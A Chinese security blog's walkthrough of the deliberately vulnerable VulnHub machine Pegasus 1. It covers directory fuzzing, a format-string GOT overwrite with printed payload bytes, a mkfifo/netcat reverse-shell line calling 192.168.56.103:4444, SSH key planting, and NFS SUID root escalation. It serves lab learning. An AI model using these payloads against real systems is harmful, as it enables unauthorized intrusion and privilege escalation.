> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/XU2MFrZ6KqU__rnh1UMz9g)

大余安全  

一个每日分享渗透小技巧的公众号![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPTQKiaXksbZia7PmHLPX2vnCWsznInTj3b9TFYtTDIYG6lDGJZYYSv72NsVWF24Kjlo4MT29tEOQSg/640?wx_fmt=png)

  

  

大家好，这里是 **大余安全** 的第 **48** 篇文章，本公众号会每日分享攻防渗透技术给大家。

![](https://mmbiz.qpic.cn/mmbiz_png/5ria5WVLahGj8W7vu6J2jzTGqRtEaL6ib9CDzENq8PCEZADfU3JXsmibNacJhY7rooNoYIpCsUytNS0k4UcSsnRfw/640?wx_fmt=png)

靶机地址：https://www.vulnhub.com/entry/pegasus-1,109/

靶机难度：中级（CTF）

靶机发布日期：2014 年 12 月 16 日

靶机描述：

欢迎使用我的第一个 boot2root VM！受到各种 CTF 活动的启发，以及我在过去几个月中学到的一些很棒的概念。

交战规则很简单 - 找到一条路，将您的特权一直升级到最根本并获得标志！

与所有此类 VM 一样，跳出框框思考，不要太早得出结论并 “精打细算” :)

VM 已在 VMWare 和 VirtualBox 上经过测试，只需将其导入，确保将网络设置为 “仅主机” 并运行它。它应该自动获取 IP 地址。

请享用！:)

请注意：对于所有这些计算机，我已经使用 VMware 运行下载的计算机。我将使用 Kali Linux 作为解决该 CTF 的攻击者机器。这里使用的技术仅用于学习教育目的，如果列出的技术用于其他任何目标，我概不负责。

![](https://mmbiz.qpic.cn/mmbiz_png/XxZOJAn437TAwOeYFBI2JiamRa34iaqY1IAPG9MaXSIKgPlBicRoyoyHPr0q6YUAhLTYebc4z2qjok0r1riadSujeg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/FAf3SbzREv1yEsWZqMDExrPvhOutWaLH9VkgQiaS11ia5Y3Xun2olnDwIhLlOiaMWe0UGE1uMpeHx4ma7lOjn8xpQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/VtRWAxRvv7GXYcc2w086cwOxcc4libkI8ibn6rD3yBlZ7vd0fH2TaYMKicrgibMcRBbxTQ5fbCJs4AgldkHtBiaPOdA/640?wx_fmt=png)

一、信息收集

![](https://mmbiz.qpic.cn/mmbiz_svg/kSiaeFj92SMyLghhftE2Ls37f4uZP8ZCOxbnsSQ1P6n6AsfOBzt5PrmdTAS3OOhPMXiabAsyKKf4QuEfoCrj9yLNlmkc5ddlpQ/640?wx_fmt=svg)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KP5rYdmpIx7ibZF923tAPIEuASIy4Bqcmha1d4cYf6TPNkX7Fbq2lBiaBrKyuU5ruibgHbmrx6FNOHLg/640?wx_fmt=png)

我们在 VM 中需要确定攻击目标的 IP 地址，需要使用 nmap 获取目标 IP 地址：

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KP5rYdmpIx7ibZF923tAPIEurdUsCkInfoouDdVMxUKibLXRhumBwOE82eL0HqvS2hbNfS3bYVTibYJg/640?wx_fmt=png)

我们已经找到了此次 CTF 目标计算机 IP 地址：

```
192.168.56.139
```

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KP5rYdmpIx7ibZF923tAPIEuoNka8xZNiagepQdGbdnEfTGerzgUHwWjlQH7K3bjaIPNWy9zogalgsg/640?wx_fmt=png)

nmap 发现开放了 22、111、8088、51435 端口... 我这边先对 web 进行渗透... 比较喜欢

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KP5rYdmpIx7ibZF923tAPIEuLUOShb55Z7dwlhdVyU1OcKLIGJo4ltM9PjVDH0ICk2Oy0yLNTibiaGGw/640?wx_fmt=png)

天马... 很帅的一张图... 利用 exiftool 没发现什么东西...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KP5rYdmpIx7ibZF923tAPIEuf6IgCfTB0sG21w23xhBqg2gQTGGgH7x7UhtMrTxk9xG5EcNRY8ELibQ/640?wx_fmt=png)

正常情况下 nikto 和 dirb 无法扫到任何信息... 我使用 rockyou 单词表进行 php 扫描... 发现

```
http://192.168.56.139:8088/submit.php
```

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KP5rYdmpIx7ibZF923tAPIEuMTWSetQWicZHSTjw8BicDFryt3hk0Rib1QKg4icjnU6fMH9jGOHfZgRibicA/640?wx_fmt=png)

我感觉还有东西... 坚持用更强的工具进行爆破...dirbuster 但是时间太久了，我换了 wfuzz 使用 directory-list-2.3-medium.txt 单词表...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KP5rYdmpIx7ibZF923tAPIEuULcXF6txqkCFU3XQ3U6vwBtibTeEXKYvDFhHxzCoIsl5SkbosqPs85g/640?wx_fmt=png)

```
wfuzz -c -z file,/usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt  --hc 404 http://192.168.56.139:8088/FUZZ.php
```

发现了存在 codereview.php 链接...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KP5rYdmpIx7ibZF923tAPIEuPHGV2U9hibupZEsticPLRlVgVS2XUUMs2dGtG2S90PM15jtUzjPqSkibg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KP5rYdmpIx7ibZF923tAPIEu7uvDuEFPW8X3SDpMJvAJ7rdlJxmU7b9r95KWKkx6kZial0vYHXbXltA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KP5rYdmpIx7ibZF923tAPIEuqV7SQpNeA1wdGoDxiaOs7Evf94P1t567t9Fj6rQxSsbqGFf8dKLhicAw/640?wx_fmt=png)

我复制了 shell 进去，点上传...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KP5rYdmpIx7ibZF923tAPIEuGuIX2eicDT4eGNGqdDDQl4X867ehgc5iaxFw3KoW1EEQcskhmFvM6pDQ/640?wx_fmt=png)

已经发送出去了... 可是我打开 NC 等了几分钟没啥反应... 说明不支持 PHP 代码... 我去分析下...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KP5rYdmpIx7ibZF923tAPIEurpk8g6gXcd3d01fHtyNaGKpbgjVDLIG8lQQ4exkRzIN2kwPUu1OPYw/640?wx_fmt=png)

我这边使用 system 代审查看下，发现回复的是...

抱歉，由于安全预防措施，Mike 不会查看任何包含 system（）函数调用的代码...

这里可以看得出，应该是限制了某种语言，我试试别的...

![](https://mmbiz.qpic.cn/mmbiz_png/FAf3SbzREv1yEsWZqMDExrPvhOutWaLH9VkgQiaS11ia5Y3Xun2olnDwIhLlOiaMWe0UGE1uMpeHx4ma7lOjn8xpQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/VtRWAxRvv7GXYcc2w086cwOxcc4libkI8ibn6rD3yBlZ7vd0fH2TaYMKicrgibMcRBbxTQ5fbCJs4AgldkHtBiaPOdA/640?wx_fmt=png)

二、提权

![](https://mmbiz.qpic.cn/mmbiz_svg/kSiaeFj92SMyLghhftE2Ls37f4uZP8ZCOxbnsSQ1P6n6AsfOBzt5PrmdTAS3OOhPMXiabAsyKKf4QuEfoCrj9yLNlmkc5ddlpQ/640?wx_fmt=svg)

在 github 找了到...

```
[链接](https://github.com/c610/tmp/blob/master/bindshell.c)
```

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KP5rYdmpIx7ibZF923tAPIEuHChEn4jxez6ibUoq4Dsnic5lxTkhqzIPGhImH6aVsPVlYC2OgfHn909w/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KP5rYdmpIx7ibZF923tAPIEuE1Msib7dAAaJ9v01tes3DS5QPiavibD2p6vBpjmexIlibK6WOqWQMVg3vQ/640?wx_fmt=png)

成功提权 mike 用户...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KP5rYdmpIx7ibZF923tAPIEu5q5C4eOtZkJDmjgyej5GxJDBOITtTuWLQiazxhBd6zSiaCLofBtw0eCw/640?wx_fmt=png)

发现 id_rsa... 密匙？？？难道和上两章一样可以直接提权??

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KP5rYdmpIx7ibZF923tAPIEudFiburNGYk1wq2VS46prNebB4fJRkYq6gcLRk5Y5GtacxImffId2fxg/640?wx_fmt=png)

不行... 我去查看下 my_first...  （这里的. ssh/authorized_keys 密匙作用是：以便无需使用反向 Shell 即可进行 SSH 输入...）

![](https://mmbiz.qpic.cn/mmbiz_png/FAf3SbzREv1yEsWZqMDExrPvhOutWaLH9VkgQiaS11ia5Y3Xun2olnDwIhLlOiaMWe0UGE1uMpeHx4ma7lOjn8xpQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/VtRWAxRvv7GXYcc2w086cwOxcc4libkI8ibn6rD3yBlZ7vd0fH2TaYMKicrgibMcRBbxTQ5fbCJs4AgldkHtBiaPOdA/640?wx_fmt=png)

缓冲区溢出：格式字符串漏洞

![](https://mmbiz.qpic.cn/mmbiz_svg/kSiaeFj92SMyLghhftE2Ls37f4uZP8ZCOxbnsSQ1P6n6AsfOBzt5PrmdTAS3OOhPMXiabAsyKKf4QuEfoCrj9yLNlmkc5ddlpQ/640?wx_fmt=svg)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KP5rYdmpIx7ibZF923tAPIEu16ibnZfhNBwHcMx07PLHGib9yiaf0Sic4V4KRqEYyS0b6En28N1mp8MMpg/640?wx_fmt=png)

这是拥有 john 用户的 SUID 位置 1 的二进制文件...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KP5rYdmpIx7ibZF923tAPIEuniaYSdZZ526MDeuWQqXjlfzfrglQ9v6UrQABD1XbfIFTUryKb0oRD2g/640?wx_fmt=png)

测试中 1+2 返回的是总和，应该存在格式字符串漏洞... 测试下...

```
1. [模糊安全格式字符串开发-第1部分](https://www.youtube.com/watch?v=NwzmYSlETI8)
 2. [模糊安全格式字符串开发-第2部分](https://www.youtube.com/watch?v=CHrs30g-3O0)
```

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KP5rYdmpIx7ibZF923tAPIEua0cI1lOVschfwc2vFUh2loStYPsU4bk1NUWvwibHAIy2myWBbt3p1ibw/640?wx_fmt=png)

通过将％x 的格式字符串参数提交到工具来测试它是否容易受到攻击...

重播的错误详细信息为 bfb66ffc，它似乎是栈堆的位置，％x 格式参数是用于从堆栈中读取数据...

可以看到第二个数字有格式字符串漏洞...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KP5rYdmpIx7ibZF923tAPIEuAbRNeSrEOH7QGNOcjWKRicsicRYr9MVsdlKlAwuJn1jdhVlpwp4ZWicvA/640?wx_fmt=png)

```
printf '1\n1\n1\n4\n' | ./my_first
```

这里用了简单的 printf 字符串进行测试... 对加 1 到 1 的样本开始进行采样...

现在要确定可以控制堆栈中的哪个参数...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KP5rYdmpIx7ibZF923tAPIEuGDBVTWibcAeibcxgsBZ67uj0SgEeQP8rHkhHuFvzP5s6N01rOB4QiczQQ/640?wx_fmt=png)

```
printf '1\n1\nAAAA.0x%%x\n4\n' | ./my_first
```

通过为它提供一个 4A 的字符串，然后将格式字符串参数增加 1 直到找到 4A，这边使用了格式化为十六进制 %x，我需要找到 41414141，因此格式字符串将以开头 AAAA.0x%s...

输出 `AAAA.0xbfb85f2c`... 需要不断增加值...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KP5rYdmpIx7ibZF923tAPIEuic6JIPgKhno5iafrJ4vJXnRxax54ibPMlgrADfJ1VtIbTjJU5nRyL9qkw/640?wx_fmt=png)

```
printf '1\n1\nAAAA.0x%%x0x%%x0x%%x0x%%x0x%%x0x%%x0x%%x0x%%x\n4\n' | ./my_first
```

使得可以进入参数 8，我加了 8 组 0x%%x... 找到了十六进制的 A 字符...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KP5rYdmpIx7ibZF923tAPIEuOBOKVsYhyUeaq6xnACUNKKdgaKt8YNhcKKevOk8oarsRhiaoic8ncadA/640?wx_fmt=png)

```
printf '1\n1\nAAAA.0x%%8$x\n4\n' | ./my_first
```

由于格式字符串中使用直接参数访问，可以直接引用参数 8...

可以看到格式字符串中的参数 8，是堆栈部分的开始...

继续使用 %n 格式字符串写入内存中的任意区域.... 要找到 printf....（print 前面章节也讲过，写过一篇格式字符串的）

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KP5rYdmpIx7ibZF923tAPIEuNS3lEtibQrKNrEUZ73fzaDrlyxqgxVkdicbAficEYRzZiaR6QaXicubJQHg/640?wx_fmt=png)

```
objdump -R ./my_first
```

为了能转储 GOT... 使用 objdump 查找 printf...

printf 查看到的位置是：08049bfc，这是要重写 printf libc 地址的部分 system()...

现在需要知道 system() 实际位置，（可能影响内存中此位置的重要向量称为 ASLR）它将有效地导致 system() 每次运行./my_first 时其地址都不同，为了解决这个问题，可以使用 ulimit 来增加堆栈大小，ulimit -s unlimited 将最大化堆栈大小，有效地导致 ASLR 实际上不存在...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KP5rYdmpIx7ibZF923tAPIEu9LnO4AeCsibR7XXZnC8cBPjsGrO2C95IaT0pibyfqCdibeibardqO7KzAg/640?wx_fmt=png)

```
ulimit -s unlimited
```

可以看到开始是 8192.... 使用后不存在了...

随着 ASLR 问题解决了，直接找到 system() 地址即可... 直接上 GDB... 讲了很多次的

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KP5rYdmpIx7ibZF923tAPIEuybjZgU0g9ARbAoefcB72ACpTmibQ8nOXMn7D85JsfBOzh1eqItXoOPA/640?wx_fmt=png)

```
gdb -q ./my_first
b main
```

....... 这里的 P 是 printf system

可以看到 system() 在 0x40069060.... 现在要使用的格式化字符串漏洞来写（使用 %n）printf() 在 **08049bfc** 上的新地址... 以 08049bfc 点在 system() 的 0x40069060 写，而不是其真正的位置...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KP5rYdmpIx7ibZF923tAPIEuGTZiau1orNyxaYIzdkhoU7upu9s8RFiaZ21HVJjia8uANkd7Qx3KiaYx6w/640?wx_fmt=png)

```
printf '1\n1\n\xfc\x9b\x04\x08%%8$n' > dayu
x/x 0x08049bfc
```

可以看到准备格式字符串所需的填充时，主要为了调试应用程序...

上图是将使用 printf() 用于管道的方法对./my_first 来重定向到文件，然后在中 gdb 中运行二进制文件，可以看到使用编译的文件来重定向输入到 printf()...

结果可以看到，正按照我的思路走着，继续...

剩下的就是填充格式字符串....

这里我详细的讲解下，NO.36 章里面格式字符串最后有算数的地方...

这边使用 python 来计算内存写入字节数，要做的是在内存位置写入字节数，要写到 system 位置，前面知道它的内存位于 0x40069060，我们将计算分为两部分，首先写 0x9060，然后写 0x4006，我们可以看到已经写入了 4 个字节...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KP5rYdmpIx7ibZF923tAPIEuY54aqp0BEJ57j1GTmEt6QlfwgbkbkYoU7ibKicsJguvrxV7JhjBZcnzw/640?wx_fmt=png)

```
shell echo $(python -c 'print 0x9060-0x4')
```

可以看到写入的前四个字节是：36956，然后减去 4 个字节，是 36952，并填充 pad 参数 8...

现在要确定地址的上半部分，将进行另一次十六进制计算，并从所需数量中删除所拥有的数量...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KP5rYdmpIx7ibZF923tAPIEu606hsdfBHlz14FS9WlusibZYNiaXJ32Mr9Zdnjj0Zbo7thGR3b9DbF2Q/640?wx_fmt=png)

```
shell echo $(python -c 'print 0x14006-0x9060')
```

这里需要在最低有效位上加一个 1，这会进入相同的内存地址，0x14006 在去进行减法... 可以看到：44966

这里末尾添加％9 $ n 才能真正覆盖此地址...

```
这里生成的格式字符串为：\xfc\x9b\x04\x08\xfe\x9b\x04\x08%%36952u%%8$n%%44966u%%9$n
```

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KP5rYdmpIx7ibZF923tAPIEuKcYKibHqfN6xbhwAdOYA4ic4DP6UPkrVMnhhJ3kXiboeTsTiavabkAeLsg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KP5rYdmpIx7ibZF923tAPIEujcDseUnjfFRXNTqeHVkdvhJ33MU2H1KXq11sntViaeV75rzPScEz3sw/640?wx_fmt=png)

```
printf '1\n1\n\xfc\x9b\x04\x08\xfe\x9b\x04\x08%%36952u%%8$n%%44966u%%9$n' > dayu
```

这里出现了 sh: 1: Selection:: not found 说明已经快完成了，没出现就前面出错了...

经过检验... 输出是正确的... 确认可以用 system（）覆盖 printf（）了..

解释下二进制文件使用导致崩溃 sh: 1: Selection:: not found，表示它现在正在尝试运行，由于 GOT 覆盖的是 system("Selection:") 而不是 printf("Selection:")...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KP5rYdmpIx7ibZF923tAPIEuvMTRKrWBKzsR1OvBXssLZlOGNSglWj7rLb56j1FHKZCt8v4DkennEg/640?wx_fmt=png)

是在返回主菜单时调用 printf，当字符串 Selection: 被放置到堆栈上时，它将被传递到 system 调用中...

所以需要创建 mkdir Selection\: 文件... 然后赋予权利...chmod +x Selection\:  

```
echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.56.103 4444 >/tmp/f' > Selection\:
```

然后写入一个简单的 netcat（不带 - e）...

执行即可....

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KP5rYdmpIx7ibZF923tAPIEutia4TFfom8lMyZVibNb1qnk6ckyEwp13aCFeQJVN19GmibkvuIdnL8wPQ/640?wx_fmt=png)

可以看到成功获得 john 权限... 但是不太稳定... 需要直接进入 john，使用 ssh 生成密匙登陆...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KP5rYdmpIx7ibZF923tAPIEuXlCpI4vyedqfibk3uNSNL9icuBawHRry5tOLLpcd0lATAdy48157kLTA/640?wx_fmt=png)

```
ssh-keygen -t rsa -C john
```

创建好了 ssh 密匙后... 将公钥添加到 john 的授权密钥文件中...（前面章节也讲过）

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KP5rYdmpIx7ibZF923tAPIEuLWyXibGfh9hsAMP3fbb5HD34iaZamjznicRS9vN3JAicd2cA0vaicQiaeknQ/640?wx_fmt=png)

写入到 john 的 rsa 即可...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KP5rYdmpIx7ibZF923tAPIEu9hyKlCmEz68sBe4Ix0y2C77S6rsHht22x5f2L5naOwtQtYpyEAAUbQ/640?wx_fmt=png)

```
chmod 600 authorized_keys  （记得给与权限...)
```

写入后直接登陆即可...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KP5rYdmpIx7ibZF923tAPIEuMmrcIibFibC5r1k4wvctuVwrrhfAiaaSyAxoDTJhhCWU5ws7xdpcNqfTQ/640?wx_fmt=png)

```
ssh john@192.168.56.139 -i john-key
```

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KP5rYdmpIx7ibZF923tAPIEuLhtOEib5Mp9q6GmJIlYvtcHgS2HrDqtzyCzf23sjZibzWYeR1KqVfSEg/640?wx_fmt=png)

成功登陆到 john 用户后，sudo 提权发现 / usr/local/sbin/nfs 目录文件可执行 root... 又是 NFS...

前面讲过很多 NFS 共享目录的事情，直接在本地共享下，创建个 shell，即可提权 root...GO

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KP5rYdmpIx7ibZF923tAPIEu1wicCRpuDIbOjniajuyuwjOEgx8qVOm2yRHWqlQTPsh1BwTmibiaqPa8Yw/640?wx_fmt=png)

启动...

```
mount 192.168.56.139:/opt/nfs nfs
```

在本地创建文件夹 nfs，然后 mount 共享即可...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KP5rYdmpIx7ibZF923tAPIEuJWMVfgDZxw5HKqHYlQd66Hk1D8bsIC4sbtmwI8GWhPVn4jQbqHmCYg/640?wx_fmt=png)

然后在本地 nfs 创建一个文本...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KP5rYdmpIx7ibZF923tAPIEum79UquJDF7d1b5UIZMhic3DI4Q8npicB0LbWtsWsQNibMeNibkfOibeiaOow/640?wx_fmt=png)

在靶机中复制 / bin/dash 到此可写文件... 然后回到本机调整 SUID 和 SGID 的位置 1...

访问即可提权成功....  NFS 参考 EXP：

```
[链接](https://www.exploit-db.com/exploits/40953)
```

当然，cp /bin/sh 也可以提权... 因为不管是 sh 还是 dash，创建的任何文件都具有 root 权限...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KP5rYdmpIx7ibZF923tAPIEu2JLGDS5ze9NeqUlQ1Kv1WkvjK60Ja8p9HspZ6uHuiaM61V2ZUyJepicg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KP5rYdmpIx7ibZF923tAPIEunoiaoiaXf1dLibQwzGHvKBZEICMzhxSGyia6jliaIzYUyl2jWNvEWLe07nA/640?wx_fmt=png)

查看 flag...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KP5rYdmpIx7ibZF923tAPIEu4201wOIict10xcOlXVPql1hRxv5g7mjQV9DtyEibo5Gdicfz0PhNQxcGA/640?wx_fmt=png)

成功获得 root 权限和 flag....

![](https://mmbiz.qpic.cn/mmbiz_png/5ria5WVLahGj8W7vu6J2jzTGqRtEaL6ib9CDzENq8PCEZADfU3JXsmibNacJhY7rooNoYIpCsUytNS0k4UcSsnRfw/640?wx_fmt=png)

前期利用 wfuzz 不同单词表爆破出了 codereview.php.... 然后上传 system 编码获得 shell.... 然后发现 my_first 二进制文件缓冲区溢出的格式字符串漏洞... 到利用 ssh 密匙转换获得 john 用户权限.... 最后利用 NFS 进行 root 提权....

这里更加熟悉了我的弱项缓冲区溢出，格式字符串漏洞.... 加油！！

由于我们已经成功得到 root 权限查看 flag，因此完成了简单靶机，希望你们喜欢这台机器，请继续关注大余后期会有更多具有挑战性的机器，一起练习学习。

如果你有其他的方法，欢迎留言。要是有写错了的地方，请你一定要告诉我。要是你觉得这篇博客写的还不错，欢迎分享给身边的人。

![](https://mmbiz.qpic.cn/mmbiz_png/XxZOJAn437TAwOeYFBI2JiamRa34iaqY1IAPG9MaXSIKgPlBicRoyoyHPr0q6YUAhLTYebc4z2qjok0r1riadSujeg/640?wx_fmt=png)

如果觉得这篇文章对你有帮助，可以转发到朋友圈，谢谢小伙伴~

![](https://mmbiz.qpic.cn/mmbiz_png/c5xrRn4430AnqkfAJc38Vpnc5XiaADLTjiciciaibYU4EHw3Nuh7YMtuB0hz3sb8Em9iatt5skAsibuuysPLdLY5LtWOw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/p3lIbvldZiabdI5iaCb3icRhtygUuo2sp6Hcdq0ANlpy5W3gL628uq032jsoVnGnl6HdGrgDXjfazFtkp6IInibDdQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPqjaFWwyrrhiciahSpOibxqKvSIFX0iaPcG00CjYIwQDwIDeIicmFMlOVNyhWYVSE8pJK566UK3YOUNWQ/640?wx_fmt=png)

欢迎加入渗透学习交流群，想入群的小伙伴们加我微信，共同进步共同成长！

![](https://mmbiz.qpic.cn/mmbiz_png/ndicuTO22p6ibN1yF91ZicoggaJJZX3vQ77Vhx81O5GRyfuQoBRjpaUyLOErsSo8PwNYlT1XzZ6fbwQuXBRKf4j3Q/640?wx_fmt=png)  

大余安全

一个全栈渗透小技巧的公众号

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPTQKiaXksbZia7PmHLPX2vnCSsnsc7MHh257oYRic1MOT8qibABNUEnTq9DUL7QBwnS52EheJf4m8iaTQ/640?wx_fmt=png)